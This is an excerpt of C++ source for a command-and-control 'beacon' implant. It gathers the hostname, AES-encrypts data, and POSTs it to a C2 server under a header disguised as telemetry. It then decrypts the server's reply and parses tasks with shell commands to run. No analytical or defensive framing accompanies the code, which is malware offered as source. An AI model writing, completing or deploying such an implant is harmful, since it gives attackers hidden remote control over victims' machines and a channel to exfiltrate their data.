...
namespace {
    ...
    std::string getHostname() {
        char host[256];
        if (gethostname(host, sizeof(host)) == 0) return std::string(host);
        return "Unknown";
    }
}
namespace beacon {
...
void Beacon::run() {
    ...
    while (true) {
        ...
        try {
            ...
            if (ur.is_open()) ur.read((char*)nonce.data(), 12);

            std::vector<BYTE> ciphertext = aes.encrypt(plaintext, nonce);
            std::vector<BYTE> enc_p;
            enc_p.insert(enc_p.end(), nonce.begin(), nonce.end());
            enc_p.insert(enc_p.end(), ciphertext.begin(), ciphertext.end());

            std::string server, path;
            std::regex re(R"(https?://([^/]+)(/.*))");
            std::smatch m;
            if (std::regex_search(c2Url_, m, re)) {
                server = m[1].str();
                path = m[2].str();
            } else {
            ...
            http::HttpClient client(core::USER_AGENTS[0]);
            std::string h_headers = "X-Telemetry-Key: " + core::API_KEY + "\r\n";
            resp = client.post(server, path, enc_p, h_headers);

            if (resp.size() >= 12) {
                LOG_INFO("Received response from C2, size: " + std::to_string(resp.size()));
                std::vector<BYTE> r_nonce(resp.begin(), resp.begin() + 12);
                std::vector<BYTE> r_ctx(resp.begin() + 12, resp.end());
                ...
                if (r_json.contains("tasks")) {
                    for (const auto& t_j : r_json["tasks"]) {
                        Task t;
                        t.task_id = t_j["task_id"];
                        t.type = stringToTaskType(t_j["type"]);
                        t.cmd = t_j.value("cmd", "");
